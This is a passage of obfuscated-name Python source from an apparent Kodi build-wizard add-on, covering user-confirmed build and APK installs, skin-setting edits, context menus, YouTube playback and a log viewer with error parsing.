			O0O0OOO000OOOOO0O .close ()#line:4309
			OOO0OO0O0O0O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4313
			O0O0OOO000OOOOO0O =open (OOO0OO0O0O0O00000 ,'r')#line:4315
			OO0O00OO0OO0O0OOO =O0O0OOO000OOOOO0O .read ()#line:4316
			O0O0OOO000OOOOO0O .close ()#line:4317
			OO0OOO0O00OOOOO00 ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4318
			O0O0000O0O00O0O0O =re .compile (OO0OOO0O00OOOOO00 ).findall (OO0O00OO0OO0O0OOO )[0 ]#line:4319
			O0O0OOO000OOOOO0O =open (OOO0OO0O0O0O00000 ,'w')#line:4320
			O0O0OOO000OOOOO0O .write (OO0O00OO0OO0O0OOO .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O0O0000O0O00O0O0O ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4321
			O0O0OOO000OOOOO0O .close ()#line:4322
			OOO0OO0O0O0O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4326
			O0O0OOO000OOOOO0O =open (OOO0OO0O0O0O00000 ,'r')#line:4328
			OO0O00OO0OO0O0OOO =O0O0OOO000OOOOO0O .read ()#line:4329
			O0O0OOO000OOOOO0O .close ()#line:4330
			OO0OOO0O00OOOOO00 ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4331
			O0O0000O0O00O0O0O =re .compile (OO0OOO0O00OOOOO00 ).findall (OO0O00OO0OO0O0OOO )[0 ]#line:4332
			O0O0OOO000OOOOO0O =open (OOO0OO0O0O0O00000 ,'w')#line:4333
			O0O0OOO000OOOOO0O .write (OO0O00OO0OO0O0OOO .replace ('<setting id="show.cdart" type="bool%s/setting>'%O0O0000O0O00O0O0O ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4334
			O0O0OOO000OOOOO0O .close ()#line:4335
			OOO0OO0O0O0O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4339
			O0O0OOO000OOOOO0O =open (OOO0OO0O0O0O00000 ,'r')#line:4341
			OO0O00OO0OO0O0OOO =O0O0OOO000OOOOO0O .read ()#line:4342
			O0O0OOO000OOOOO0O .close ()#line:4343
			OO0OOO0O00OOOOO00 ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4344
			O0O0000O0O00O0O0O =re .compile (OO0OOO0O00OOOOO00 ).findall (OO0O00OO0OO0O0OOO )[0 ]#line:4345
			O0O0OOO000OOOOO0O =open (OOO0OO0O0O0O00000 ,'w')#line:4346
			O0O0OOO000OOOOO0O .write (OO0O00OO0OO0O0OOO .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O0O0000O0O00O0O0O ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4347
			O0O0OOO000OOOOO0O .close ()#line:4348
		except :#line:4353
			pass #line:4354
def thirdPartyInstall (O0O0000O0OO0O0OO0 ,O0O0OOOOOO0O0O000 ):#line:4356
	if not wiz .workingURL (O0O0OOOOOO0O0O000 ):#line:4357
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4358
	O000O00O0OOOO000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0000O0OO0O0OO0 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4359
	if O000O00O0OOOO000O ==1 :#line:4360
		freshStart ('third',True )#line:4361
	wiz .clearS ('build')#line:4362
	O0O000O0O0000O000 =O0O0000O0OO0O0OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4363
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4364
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0000O0OO0O0OO0 ),'','אנא המתן')#line:4365
	O00O0O000000OO00O =os .path .join (PACKAGES ,'%s.zip'%O0O000O0O0000O000 )#line:4366
	try :os .remove (O00O0O000000OO00O )#line:4367
	except :pass #line:4368
	downloader .download (O0O0OOOOOO0O0O000 ,O00O0O000000OO00O ,DP )#line:4369
	xbmc .sleep (1000 )#line:4370
	O00O00OO0OO000000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0000O0OO0O0OO0 )#line:4371
	DP .update (0 ,O00O00OO0OO000000 ,'','אנא המתן')#line:4372
	O00OOO0O0OO00O000 ,O0O000OOO0OO0O0O0 ,OO0OO00OOO00OOO0O =extract .all (O00O0O000000OO00O ,HOME ,DP ,title =O00O00OO0OO000000 )#line:4373
	if int (float (O00OOO0O0OO00O000 ))>0 :#line:4374
		wiz .fixmetas ()#line:4375
		wiz .lookandFeelData ('save')#line:4376
		wiz .defaultSkin ()#line:4377
		wiz .setS ('installed','true')#line:4379
		wiz .setS ('extract',str (O00OOO0O0OO00O000 ))#line:4380
		wiz .setS ('errors',str (O0O000OOO0OO0O0O0 ))#line:4381
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O00OOO0O0OO00O000 ,O0O000OOO0OO0O0O0 ))#line:4382
		try :os .remove (O00O0O000000OO00O )#line:4383
		except :pass #line:4384
		if int (float (O0O000OOO0OO0O0O0 ))>0 :#line:4385
			OO0O0O000OOO0OO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0000O0OO0O0OO0 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O00OOO0O0OO00O000 ,'%',COLOR1 ,O0O000OOO0OO0O0O0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4386
			if OO0O0O000OOO0OO00 :#line:4387
				if isinstance (O0O000OOO0OO0O0O0 ,unicode ):#line:4388
					OO0OO00OOO00OOO0O =OO0OO00OOO00OOO0O .encode ('utf-8')#line:4389
				wiz .TextBox (ADDONTITLE ,OO0OO00OOO00OOO0O )#line:4390
	DP .close ()#line:4391
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4392
	if INSTALLMETHOD ==1 :OOOO0O00O0000O0O0 =1 #line:4393
	elif INSTALLMETHOD ==2 :OOOO0O00O0000O0O0 =0 #line:4394
	else :OOOO0O00O0000O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4395
	if OOOO0O00O0000O0O0 ==1 :wiz .reloadFix ()#line:4396
	else :wiz .killxbmc (True )#line:4397
def testTheme (O0O0OO0O0OO00OOO0 ):#line:4399
	OOO0O0O000O0OOOOO =zipfile .ZipFile (O0O0OO0O0OO00OOO0 )#line:4400
	for O0OO000O0OO00000O in OOO0O0O000O0OOOOO .infolist ():#line:4401
		if '/settings.xml'in O0OO000O0OO00000O .filename :#line:4402
			return True #line:4403
	return False #line:4404
def testGui (OOO0OO0O0OOO0O000 ):#line:4406
	OO0OOOO000OOO0O0O =zipfile .ZipFile (OOO0OO0O0OOO0O000 )#line:4407
	for O0OO00000O0O0O000 in OO0OOOO000OOO0O0O .infolist ():#line:4408
		if '/guisettings.xml'in O0OO00000O0O0O000 .filename :#line:4409
			return True #line:4410
	return False #line:4411
def apkInstaller (O0O0000OOO00O00O0 ,OO0000OO000000O0O ):#line:4413
	wiz .log (O0O0000OOO00O00O0 )#line:4414
	wiz .log (OO0000OO000000O0O )#line:4415
	if wiz .platform ()=='android':#line:4416
		O0000OOOO0000O000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0000OOO00O00O0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4417
		if not O0000OOOO0000O000 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4418
		O0OOOOOO0O0OOOO0O =O0O0000OOO00O00O0 #line:4419
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4420
		if not wiz .workingURL (OO0000OO000000O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4421
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOOOOO0O0OOOO0O ),'','אנא המתן')#line:4422
		O000000000OO0O000 =os .path .join (PACKAGES ,"%s.apk"%O0O0000OOO00O00O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4423
		try :os .remove (O000000000OO0O000 )#line:4424
		except :pass #line:4425
		downloader .download (OO0000OO000000O0O ,O000000000OO0O000 ,DP )#line:4426
		xbmc .sleep (100 )#line:4427
		DP .close ()#line:4428
		notify .apkInstaller (O0O0000OOO00O00O0 )#line:4429
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O000000000OO0O000 +'")')#line:4430
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4431
def createMenu (OOO0OOO0OOO0000OO ,O0OO0OOO00OO0OOO0 ,OO000OO0OO0O00OO0 ):#line:4437
	if OOO0OOO0OOO0000OO =='saveaddon':#line:4438
		OO000O0OOOOO0OOOO =[]#line:4439
		O0O0OOOO0O00O00OO =urllib .quote_plus (O0OO0OOO00OO0OOO0 .lower ().replace (' ',''))#line:4440
		O0OOOOOOOO0O000OO =O0OO0OOO00OO0OOO0 .replace ('Debrid','Real Debrid')#line:4441
		OO000OO0000000OOO =urllib .quote_plus (OO000OO0OO0O00OO0 .lower ().replace (' ',''))#line:4442
		OO000OO0OO0O00OO0 =OO000OO0OO0O00OO0 .replace ('url','URL Resolver')#line:4443
		OO000O0OOOOO0OOOO .append ((THEME2 %OO000OO0OO0O00OO0 .title (),' '))#line:4444
		OO000O0OOOOO0OOOO .append ((THEME3 %'Save %s Data'%O0OOOOOOOO0O000OO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O0OOOO0O00O00OO ,OO000OO0000000OOO )))#line:4445
		OO000O0OOOOO0OOOO .append ((THEME3 %'Restore %s Data'%O0OOOOOOOO0O000OO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O0OOOO0O00O00OO ,OO000OO0000000OOO )))#line:4446
		OO000O0OOOOO0OOOO .append ((THEME3 %'Clear %s Data'%O0OOOOOOOO0O000OO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0O0OOOO0O00O00OO ,OO000OO0000000OOO )))#line:4447
	elif OOO0OOO0OOO0000OO =='save':#line:4448
		OO000O0OOOOO0OOOO =[]#line:4449
		O0O0OOOO0O00O00OO =urllib .quote_plus (O0OO0OOO00OO0OOO0 .lower ().replace (' ',''))#line:4450
		O0OOOOOOOO0O000OO =O0OO0OOO00OO0OOO0 .replace ('Debrid','Real Debrid')#line:4451
		OO000OO0000000OOO =urllib .quote_plus (OO000OO0OO0O00OO0 .lower ().replace (' ',''))#line:4452
		OO000OO0OO0O00OO0 =OO000OO0OO0O00OO0 .replace ('url','URL Resolver')#line:4453
		OO000O0OOOOO0OOOO .append ((THEME2 %OO000OO0OO0O00OO0 .title (),' '))#line:4454
		OO000O0OOOOO0OOOO .append ((THEME3 %'Register %s'%O0OOOOOOOO0O000OO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0O0OOOO0O00O00OO ,OO000OO0000000OOO )))#line:4455
		OO000O0OOOOO0OOOO .append ((THEME3 %'Save %s Data'%O0OOOOOOOO0O000OO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O0OOOO0O00O00OO ,OO000OO0000000OOO )))#line:4456
		OO000O0OOOOO0OOOO .append ((THEME3 %'Restore %s Data'%O0OOOOOOOO0O000OO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O0OOOO0O00O00OO ,OO000OO0000000OOO )))#line:4457
		OO000O0OOOOO0OOOO .append ((THEME3 %'Import %s Data'%O0OOOOOOOO0O000OO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0O0OOOO0O00O00OO ,OO000OO0000000OOO )))#line:4458
		OO000O0OOOOO0OOOO .append ((THEME3 %'Clear Addon %s Data'%O0OOOOOOOO0O000OO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0O0OOOO0O00O00OO ,OO000OO0000000OOO )))#line:4459
	elif OOO0OOO0OOO0000OO =='install':#line:4460
		OO000O0OOOOO0OOOO =[]#line:4461
		OO000OO0000000OOO =urllib .quote_plus (OO000OO0OO0O00OO0 )#line:4462
		OO000O0OOOOO0OOOO .append ((THEME2 %OO000OO0OO0O00OO0 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OO000OO0000000OOO )))#line:4463
		OO000O0OOOOO0OOOO .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OO000OO0000000OOO )))#line:4464
		OO000O0OOOOO0OOOO .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OO000OO0000000OOO )))#line:4465
		OO000O0OOOOO0OOOO .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OO000OO0000000OOO )))#line:4466
		OO000O0OOOOO0OOOO .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OO000OO0000000OOO )))#line:4467
	OO000O0OOOOO0OOOO .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4468
	return OO000O0OOOOO0OOOO #line:4469
def toggleCache (OOO00O0000OOO0O0O ):#line:4471
	O00000O0O00O0OO00 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4472
	OO0000O0O0O00O0OO =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4473
	if OOO00O0000OOO0O0O in ['true','false']:#line:4474
		for OOO000OOO0OO0OO0O in O00000O0O00O0OO00 :#line:4475
			wiz .setS (OOO000OOO0OO0OO0O ,OOO00O0000OOO0O0O )#line:4476
	else :#line:4477
		if not OOO00O0000OOO0O0O in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4478
			try :#line:4479
				OOO000OOO0OO0OO0O =OO0000O0O0O00O0OO [O00000O0O00O0OO00 .index (OOO00O0000OOO0O0O )]#line:4480
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OOO000OOO0OO0OO0O ))#line:4481
			except :#line:4482
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OOO00O0000OOO0O0O ))#line:4483
		else :#line:4484
			OOOOO00O0000OOO00 ='true'if wiz .getS (OOO00O0000OOO0O0O )=='false'else 'false'#line:4485
			wiz .setS (OOO00O0000OOO0O0O ,OOOOO00O0000OOO00 )#line:4486
def playVideo (O00000000O0OO0OOO ):#line:4488
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O00000000O0OO0OOO )#line:4489
	if 'watch?v='in O00000000O0OO0OOO :#line:4490
		OO0O0O00OOOOO000O ,OOOO000OO0OO0O0OO =O00000000O0OO0OOO .split ('?')#line:4491
		O00OOO0O000OO000O =OOOO000OO0OO0O0OO .split ('&')#line:4492
		for OOOOOOOO00000O00O in O00OOO0O000OO000O :#line:4493
			if OOOOOOOO00000O00O .startswith ('v='):#line:4494
				O00000000O0OO0OOO =OOOOOOOO00000O00O [2 :]#line:4495
				break #line:4496
			else :continue #line:4497
	elif 'embed'in O00000000O0OO0OOO or 'youtu.be'in O00000000O0OO0OOO :#line:4498
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O00000000O0OO0OOO )#line:4499
		OO0O0O00OOOOO000O =O00000000O0OO0OOO .split ('/')#line:4500
		if len (OO0O0O00OOOOO000O [-1 ])>5 :#line:4501
			O00000000O0OO0OOO =OO0O0O00OOOOO000O [-1 ]#line:4502
		elif len (OO0O0O00OOOOO000O [-2 ])>5 :#line:4503
			O00000000O0OO0OOO =OO0O0O00OOOOO000O [-2 ]#line:4504
	wiz .log ("YouTube URL: %s"%O00000000O0OO0OOO )#line:4505
	yt .PlayVideo (O00000000O0OO0OOO )#line:4506
def viewLogFile ():#line:4508
	O00OOO00O00O00O0O =wiz .Grab_Log (True )#line:4509
	OOOO0OO00O0OOO0OO =wiz .Grab_Log (True ,True )#line:4510
	OO0OOO0OO0000OOOO =0 ;O00O0O0O00OOOO00O =O00OOO00O00O00O0O #line:4511
	if not OOOO0OO00O0OOO0OO ==False and not O00OOO00O00O00O0O ==False :#line:4512
		OO0OOO0OO0000OOOO =DIALOG .select (ADDONTITLE ,["View %s"%O00OOO00O00O00O0O .replace (LOG ,""),"View %s"%OOOO0OO00O0OOO0OO .replace (LOG ,"")])#line:4513
		if OO0OOO0OO0000OOOO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4514
	elif O00OOO00O00O00O0O ==False and OOOO0OO00O0OOO0OO ==False :#line:4515
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4516
		return #line:4517
	elif not O00OOO00O00O00O0O ==False :OO0OOO0OO0000OOOO =0 #line:4518
	elif not OOOO0OO00O0OOO0OO ==False :OO0OOO0OO0000OOOO =1 #line:4519
	O00O0O0O00OOOO00O =O00OOO00O00O00O0O if OO0OOO0OO0000OOOO ==0 else OOOO0OO00O0OOO0OO #line:4521
	O0000O0O00OO000OO =wiz .Grab_Log (False )if OO0OOO0OO0000OOOO ==0 else wiz .Grab_Log (False ,True )#line:4522
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O00O0O0O00OOOO00O ),O0000O0O00OO000OO )#line:4524
def errorChecking (log =None ,count =None ,all =None ):#line:4526
	if log ==None :#line:4527
		O0O0O000O0O0O0000 =wiz .Grab_Log (True )#line:4528
		O0OO0O0OOO0O000O0 =wiz .Grab_Log (True ,True )#line:4529
		if not O0OO0O0OOO0O000O0 ==False and not O0O0O000O0O0O0000 ==False :#line:4530
			OO0O0O000000OOO00 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0O0O000O0O0O0000 .replace (LOG ,""),errorChecking (O0O0O000O0O0O0000 ,True ,True )),"View %s: %s error(s)"%(O0OO0O0OOO0O000O0 .replace (LOG ,""),errorChecking (O0OO0O0OOO0O000O0 ,True ,True ))])#line:4531
			if OO0O0O000000OOO00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4532
		elif O0O0O000O0O0O0000 ==False and O0OO0O0OOO0O000O0 ==False :#line:4533
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4534
			return #line:4535
		elif not O0O0O000O0O0O0000 ==False :OO0O0O000000OOO00 =0 #line:4536
		elif not O0OO0O0OOO0O000O0 ==False :OO0O0O000000OOO00 =1 #line:4537
		log =O0O0O000O0O0O0000 if OO0O0O000000OOO00 ==0 else O0OO0O0OOO0O000O0 #line:4538
	if log ==False :#line:4539
		if count ==None :#line:4540
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4541
			return False #line:4542
		else :#line:4543
			return 0 #line:4544
	else :#line:4545
		if os .path .exists (log ):#line:4546
			OO000OOOOOO000000 =open (log ,mode ='r');O0OOO0O00000O0000 =OO000OOOOOO000000 .read ().replace ('\n','').replace ('\r','');OO000OOOOOO000000 .close ()#line:4547
			O0OO00O0000O00OOO =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O0OOO0O00000O0000 )#line:4548
			if not count ==None :#line:4549
				if all ==None :#line:4550
					O0O0O000O0000000O =0 #line:4551
					for OO0O0O00OOO0OOOOO in O0OO00O0000O00OOO :#line:4552
						if ADDON_ID in OO0O0O00OOO0OOOOO :O0O0O000O0000000O +=1 #line:4553
					return O0O0O000O0000000O #line:4554
				else :return len (O0OO00O0000O00OOO )#line:4555
			if len (O0OO00O0000O00OOO )>0 :#line:4556
				O0O0O000O0000000O =0 ;O00000OOOOO0O0O00 =""#line:4557
				for OO0O0O00OOO0OOOOO in O0OO00O0000O00OOO :#line:4558
					if all ==None and not ADDON_ID in OO0O0O00OOO0OOOOO :continue #line:4559
					else :#line:4560
						O0O0O000O0000000O +=1 #line:4561
						O00000OOOOO0O0O00 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0O0O000O0000000O ,OO0O0O00OOO0OOOOO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4562
				if O0O0O000O0000000O >0 :#line:4563
					wiz .TextBox (ADDONTITLE ,O00000OOOOO0O0O00 )#line:4564
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4565
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4566
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4567
ACTION_PREVIOUS_MENU =10 #line:4569
ACTION_NAV_BACK =92 #line:4570
ACTION_MOVE_LEFT =1 #line:4571
ACTION_MOVE_RIGHT =2 #line:4572
ACTION_MOVE_UP =3 #line:4573
ACTION_MOVE_DOWN =4 #line:4574
ACTION_MOUSE_WHEEL_UP =104 #line:4575
ACTION_MOUSE_WHEEL_DOWN =105 #line:4576
ACTION_MOVE_MOUSE =107 #line:4577
ACTION_SELECT_ITEM =7 #line:4578
ACTION_BACKSPACE =110 #line:4579
ACTION_MOUSE_LEFT_CLICK =100 #line:4580
ACTION_MOUSE_LONG_CLICK =108 #line:4581
def LogViewer (default =None ):#line:4583
	class OOO000OOOOO00OOO0 (xbmcgui .WindowXMLDialog ):#line:4584
		def __init__ (O0O0O0OO0OOO00OO0 ,*OO00OOO00000O0O0O ,**O0OOOO00OOO000OO0 ):#line:4585
			O0O0O0OO0OOO00OO0 .default =O0OOOO00OOO000OO0 ['default']#line:4586
		def onInit (O000O00OOOOO00O00 ):#line:4588
			O000O00OOOOO00O00 .title =101 #line:4589
			O000O00OOOOO00O00 .msg =102 #line:4590
			O000O00OOOOO00O00 .scrollbar =103 #line:4591
			O000O00OOOOO00O00 .upload =201 #line:4592
			O000O00OOOOO00O00 .kodi =202 #line:4593
			O000O00OOOOO00O00 .kodiold =203 #line:4594
			O000O00OOOOO00O00 .wizard =204 #line:4595
			O000O00OOOOO00O00 .okbutton =205 #line:4596
			OOO00O0OO00OOO000 =open (O000O00OOOOO00O00 .default ,'r')#line:4597
			O000O00OOOOO00O00 .logmsg =OOO00O0OO00OOO000 .read ()#line:4598
			OOO00O0OO00OOO000 .close ()#line:4599
			O000O00OOOOO00O00 .titlemsg ="%s: %s"%(ADDONTITLE ,O000O00OOOOO00O00 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4600
			O000O00OOOOO00O00 .showdialog ()#line:4601
		def showdialog (O00OO0OO00000O00O ):#line:4603
			O00OO0OO00000O00O .getControl (O00OO0OO00000O00O .title ).setLabel (O00OO0OO00000O00O .titlemsg )#line:4604
			O00OO0OO00000O00O .getControl (O00OO0OO00000O00O .msg ).setText (wiz .highlightText (O00OO0OO00000O00O .logmsg ))#line:4605
			O00OO0OO00000O00O .setFocusId (O00OO0OO00000O00O .scrollbar )#line:4606
		def onClick (OOOO0OOOO00OOOO00 ,OOO0O0000O000OOO0 ):#line:4608
			if OOO0O0000O000OOO0 ==OOOO0OOOO00OOOO00 .okbutton :OOOO0OOOO00OOOO00 .close ()#line:4609
			elif OOO0O0000O000OOO0 ==OOOO0OOOO00OOOO00 .upload :OOOO0OOOO00OOOO00 .close ();uploadLog .Main ()#line:4610
			elif OOO0O0000O000OOO0 ==OOOO0OOOO00OOOO00 .kodi :#line:4611
				OOOOO0O0O00O00OO0 =wiz .Grab_Log (False )#line:4612
				OO00OO000OOOO0O00 =wiz .Grab_Log (True )#line:4613
				if OOOOO0O0O00O00OO0 ==False :#line:4614
					OOOO0OOOO00OOOO00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4615
					OOOO0OOOO00OOOO00 .getControl (OOOO0OOOO00OOOO00 .msg ).setText ("Log File Does Not Exists!")#line:4616
				else :#line:4617
					OOOO0OOOO00OOOO00 .titlemsg ="%s: %s"%(ADDONTITLE ,OO00OO000OOOO0O00 .replace (LOG ,''))#line:4618
					OOOO0OOOO00OOOO00 .getControl (OOOO0OOOO00OOOO00 .title ).setLabel (OOOO0OOOO00OOOO00 .titlemsg )#line:4619
					OOOO0OOOO00OOOO00 .getControl (OOOO0OOOO00OOOO00 .msg ).setText (wiz .highlightText (OOOOO0O0O00O00OO0 ))#line:4620
					OOOO0OOOO00OOOO00 .setFocusId (OOOO0OOOO00OOOO00 .scrollbar )#line:4621
			elif OOO0O0000O000OOO0 ==OOOO0OOOO00OOOO00 .kodiold :#line:4622
				OOOOO0O0O00O00OO0 =wiz .Grab_Log (False ,True )#line:4623
				OO00OO000OOOO0O00 =wiz .Grab_Log (True ,True )#line:4624
				if OOOOO0O0O00O00OO0 ==False :#line:4625
					OOOO0OOOO00OOOO00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4626
					OOOO0OOOO00OOOO00 .getControl (OOOO0OOOO00OOOO00 .msg ).setText ("Log File Does Not Exists!")#line:4627
				else :#line:4628
					OOOO0OOOO00OOOO00 .titlemsg ="%s: %s"%(ADDONTITLE ,OO00OO000OOOO0O00 .replace (LOG ,''))#line:4629
					OOOO0OOOO00OOOO00 .getControl (OOOO0OOOO00OOOO00 .title ).setLabel (OOOO0OOOO00OOOO00 .titlemsg )#line:4630
					OOOO0OOOO00OOOO00 .getControl (OOOO0OOOO00OOOO00 .msg ).setText (wiz .highlightText (OOOOO0O0O00O00OO0 ))#line:4631
					OOOO0OOOO00OOOO00 .setFocusId (OOOO0OOOO00OOOO00 .scrollbar )#line:4632
			elif OOO0O0000O000OOO0 ==OOOO0OOOO00OOOO00 .wizard :#line:4633
				OOOOO0O0O00O00OO0 =wiz .Grab_Log (False ,False ,True )#line:4634
				OO00OO000OOOO0O00 =wiz .Grab_Log (True ,False ,True )#line:4635
				if OOOOO0O0O00O00OO0 ==False :#line:4636
					OOOO0OOOO00OOOO00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4637
					OOOO0OOOO00OOOO00 .getControl (OOOO0OOOO00OOOO00 .msg ).setText ("Log File Does Not Exists!")#line:4638
				else :#line:4639
					OOOO0OOOO00OOOO00 .titlemsg ="%s: %s"%(ADDONTITLE ,OO00OO000OOOO0O00 .replace (ADDONDATA ,''))#line:4640
					OOOO0OOOO00OOOO00 .getControl (OOOO0OOOO00OOOO00 .title ).setLabel (OOOO0OOOO00OOOO00 .titlemsg )#line:4641
					OOOO0OOOO00OOOO00 .getControl (OOOO0OOOO00OOOO00 .msg ).setText (wiz .highlightText (OOOOO0O0O00O00OO0 ))#line:4642
					OOOO0OOOO00OOOO00 .setFocusId (OOOO0OOOO00OOOO00 .scrollbar )#line:4643
		def onAction (O0OO00OO0000000OO ,O000OOOO00OO00OO0 ):#line:4645
			if O000OOOO00OO00OO0 ==ACTION_PREVIOUS_MENU :O0OO00OO0000000OO .close ()#line:4646
